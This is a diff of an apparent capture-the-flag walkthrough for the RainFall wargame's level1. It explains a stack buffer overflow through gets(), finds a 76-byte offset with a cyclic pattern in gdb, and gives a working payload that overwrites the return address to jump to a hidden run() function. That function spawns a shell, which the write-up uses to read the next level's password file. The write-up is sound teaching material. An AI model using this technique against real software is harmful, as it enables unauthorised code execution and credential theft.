@@ -1,14 +1,42 @@
-📘 Buffer Overflow Exploit: Level 1
+📘 Buffer Overflow Exploit: 
 This is a classic stack-based buffer overflow example that demonstrates how you can redirect program execution to custom code by overflowing a buffer.
+
+💡 How the stack layout works in a function call
+When a function is called (like main()), the stack grows downward and sets up a frame like this:
+
+| higher memory addresses |
++------------------------+
+| function arguments     |
++------------------------+
+| return address         | <-- Overwriting this = code execution
++------------------------+
+| saved EBP (base ptr)   |
++------------------------+
+| local variables        | <-- buffer[] lives here
++------------------------+
+| lower memory addresses |
 
 ⚠️ Vulnerability Summary
 The binary uses the unsafe gets() function.
-
 gets() does not check how much input is provided.
-
 So if you input more than the buffer can hold, it will start overwriting adjacent memory — including the saved return address on the stack.
 
 This allows us to control the program's flow after the current function returns.
+
+Example with buffer
+Say we have this code:
+
+void vulnerable() {
+    char buffer[80];
+    gets(buffer);
+}
+
+When vulnerable() is called, the stack looks like:
+[buffer]          <-- 80 bytes
+[saved EBP]       <-- previous base pointer (optional, depends on compiler)
+[return address]  <-- where execution jumps after `vulnerable()` returns
+
+So if you input more than 80 bytes, the next bytes overwrite the saved EBP (not dangerous yet), and then the return address.
 
 🧠 Our Goal
 There is a hidden function in the binary named run() located at: 0x08048444
@@ -18,22 +46,14 @@ This function calls: system("/bin/sh");
 🔎 Finding the Offset
 To exploit this, we first need to know how many bytes it takes to reach the saved return address on the stack.
 
-Step 1: Try 80 characters and check if EIP is overwritten
+Step 1: find offset with patterngenerator and check if EIP is overwritten
+(gdb) run 
+Starting program: /home/user/level1/level1 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
 
-$ python -c 'print "B" * 80' > /tmp/payload
-(gdb) r < /tmp/payload
-Output:
 Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-✅ EIP is overwritten with 0x42 ("B" in ASCII) — good sign.
-
-Step 2: Try 76 characters
-$ python -c 'print "B" * 76' > /tmp/payload
-(gdb) r < /tmp/payload
-Output:
-Program received signal SIGILL, Illegal instruction.
-0xb7e45400 in __libc_start_main ()
-✅ At 76 bytes, we don’t overwrite EIP yet, so offset is exactly 76 bytes.
+0x63413563 in ?? ()
+'cA5c' -> "c5Ac" -> index 76
 
 🛠 Crafting the Exploit
 Here’s the working exploit:
@@ -41,11 +61,9 @@ Here’s the working exploit:
 
 🔍 Explanation
 python -c '...': We use Python to generate the exploit payload.
-
 "A" * 76: Fills the buffer right up to the return address.
-
 struct.pack("<I", 0x08048444): Packs the address of run() in little-endian format (\x44\x84\x04\x08).
-< — little-endian
+< — little-endian (least significant byte is stored first)  // lscpu | grep "Byte Order"
 I — unsigned 4-byte integer
 
 cat: Keeps stdin open — sometimes required if the program reads input again.
@@ -75,8 +93,9 @@ cat /home/user/level2/.pass
 
 
 alternative:
-find the offset in the pattern 
-```Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4```
+level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/try
 
-"c5Ac"
+level1@RainFall:~$ cat /tmp/try - | ./level1 
+Good... Wait what?
+
 
